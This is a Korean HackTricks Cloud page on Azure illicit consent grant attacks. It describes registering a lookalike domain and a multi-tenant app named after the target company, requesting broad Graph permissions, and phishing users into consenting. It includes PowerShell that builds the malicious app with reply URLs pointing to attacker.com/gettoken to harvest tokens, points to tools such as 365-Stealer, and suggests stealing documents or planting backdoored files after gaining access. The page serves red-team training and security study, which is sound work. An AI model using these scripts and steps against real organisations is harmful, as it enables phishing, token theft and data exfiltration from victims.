# Az - 불법 동의 부여

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## OAuth 앱 피싱

**Azure 애플리케이션**은 **사용자 데이터**(기본 정보 및 문서 액세스, 이메일 전송 등)에 액세스하기 위한 **권한을 요청**합니다.\
**허용**되면 일반 사용자는 **"낮은 영향" 권한**에 대해서만 동의를 부여할 수 있습니다. **다른 모든 경우에는 관리자 동의가 필요**합니다.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` 및 `애플리케이션에 권한을 부여하는 권한`을 포함하는 사용자 정의 역할은 테넌트 전체 동의를 제공할 수 있습니다.

관리자 동의가 필요하지 않은 권한만이 **낮은 영향**으로 분류됩니다. 이는 기본 로그인에 필요한 권한인 openid, profile, email, User.Read 및 offline\_access입니다. **조직**이 **모든 앱에 대한 사용자 동의를 허용**하는 경우, 직원은 앱에 대해 **프로필에서 위의 정보를 읽을 수 있는 동의**를 부여할 수 있습니다.

<figure><img src="../../../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

따라서 공격자는 **악성 앱**을 준비하고 **피싱**을 통해 사용자가 **앱을 수락하고 데이터를 도용**하도록 할 수 있습니다.

### 사용자가 동의할 수 있는지 확인

다음 PowerShell 명령은 Azure Active Directory (Azure AD)에서 사용자가 애플리케이션에 동의할 수 있는지에 대한 동의 구성을 확인하는 데 사용됩니다:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **사용자 동의 비활성화**: 이 설정은 사용자가 애플리케이션에 권한을 부여하는 것을 금지합니다. 사용자 동의를 애플리케이션에 허용하지 않습니다.
* **검증된 배포자 또는 조직에서 앱에 동의할 수 있지만 선택한 권한에 대해서만**: 이 설정은 모든 사용자가 검증된 배포자에 의해 배포된 애플리케이션 및 자체 테넌트에 등록된 애플리케이션에만 동의할 수 있도록 허용합니다. 특정 권한에 대해서만 동의를 허용함으로써 제어 수준을 추가합니다.
* **모든 앱에 동의할 수 있음**: 이 설정은 더 허용적이며, 관리 동의가 필요하지 않는 한 모든 사용자가 어떤 권한에 대해서든지 애플리케이션에 동의할 수 있도록 허용합니다.
* **사용자 정의 앱 동의 정책**: 이 설정은 사용자 정의 정책이 적용되어 있음을 나타내며, 특정 조직 요구 사항에 맞게 조정될 수 있으며, 앱 배포자, 앱이 요청하는 권한 및 기타 요소에 기반한 제한의 조합을 포함할 수 있습니다.


## **불법 동의 부여 공격 이해**

불법 동의 부여 공격에서 공격자는 사용자들을 속여 Azure에 등록된 악성 애플리케이션에 권한을 부여하도록 유도합니다. 이는 애플리케이션이 신뢰할 수 있는 것처럼 보이도록 만들어 피해자들이 "수락" 버튼을 알지 못하게 클릭하게 만드는 것으로 이루어집니다. 결과적으로 Azure AD는 토큰을 공격자의 사이트에 발급하여 조직 계정이 필요하지 않고도 피해자의 데이터에 액세스하고 조작할 수 있게 합니다. 이는 이메일 읽기 또는 전송, 파일 액세스 등과 같은 피해자의 데이터를 읽거나 조작하는 것을 포함합니다.

## **공격 흐름 개요**

이 공격은 일반적인 회사를 대상으로 여러 단계를 거쳐 진행됩니다. 다음은 공격이 어떻게 전개될 수 있는지에 대한 예시입니다:

1. **도메인 등록 및 애플리케이션 호스팅**: 공격자는 신뢰할 수 있는 사이트와 유사한 도메인을 등록합니다. 예를 들어 "safedomainlogin.com"입니다. 이 도메인 아래에 악성 애플리케이션을 호스팅하기 위해 하위 도메인을 생성합니다(예: "companyname.safedomainlogin.com").

2. **Azure AD에서 애플리케이션 등록**: 공격자는 자신의 Azure AD 테넌트에서 Multi-Tenant 애플리케이션을 등록합니다. 이 애플리케이션은 신뢰할 수 있는 것처럼 보이기 위해 대상 회사의 이름으로 지정됩니다. 공격자는 악성 애플리케이션을 호스팅하는 하위 도메인을 가리키도록 애플리케이션의 리디렉션 URL을 구성합니다.

3. **권한 설정**: 공격자는 애플리케이션에 다양한 API 권한(`Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read` 등)을 설정합니다. 사용자가 이러한 권한을 부여하면 공격자는 사용자를 대신하여 민감한 정보를 추출할 수 있게 됩니다.

4. **악성 링크 배포**: 공격자는 악성 애플리케이션의 클라이언트 ID를 포함한 링크를 작성하고 대상 사용자들과 공유함으로써 동의를 부여하도록 속입니다.

## **공격에 대한 도구 활용**

이 공격은 [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer)와 같은 도구를 사용하여 수행될 수 있습니다.

### 공격 전 준비:
공격자가 피해 조직의 사용자에게 어느 정도의 액세스 권한이 있다면, 조직의 정책이 사용자가 앱을 수락할 수 있는지 확인할 수 있습니다.
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
공격을 실행하기 위해 공격자는 **Azure 테넌트**의 App 등록에서 **새로운 앱을 생성**해야 합니다. 이 앱은 다음과 같이 구성되어야 합니다:

<figure><img src="../../../.gitbook/assets/image (2) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All`은 `Microsoft Graph`의 `Delegated permissions`에 있습니다. (애플리케이션 권한은 항상 추가 승인이 필요합니다).

* `User.ReadBasic.All`은 부여된 경우 조직의 **모든 사용자 정보를 읽을 수 있는 권한**입니다.
* 전체 테넌트 동의를 제공할 수 있는 역할은 `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` 및 `애플리케이션에 권한을 부여하는 권한`을 포함하는 사용자 정의 역할뿐입니다. 따라서 **관리자 동의가 필요한 앱**을 승인하도록 하려면 이러한 역할 중 하나를 가진 사용자를 **피싱**해야 합니다.

또한 다음 명령을 사용하여 cli를 통해 앱을 생성할 수도 있습니다:

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

구성 방법에 대해 알아보려면 [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)를 확인하세요.

{% hint style="warning" %}
얻은 **액세스 토큰**은 **그래프 엔드포인트**에 대한 것이며, `User.Read` 및 `User.ReadBasic.All` (요청된 권한) 스코프를 가지게 됩니다. 다른 작업을 수행할 수는 없지만 (그러나 이러한 권한은 조직의 **모든 사용자에 대한 정보를 다운로드**하는 데 충분합니다).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

이 도구를 사용하여 이 공격을 수행할 수도 있습니다.

## 사후 침투

사용자에게 액세스 권한을 얻은 후에는 민감한 문서를 도용하거나 백도어가 있는 문서 파일을 업로드하는 등의 작업을 수행할 수 있습니다.

## 참고 자료

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅까지 AWS 해킹을 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
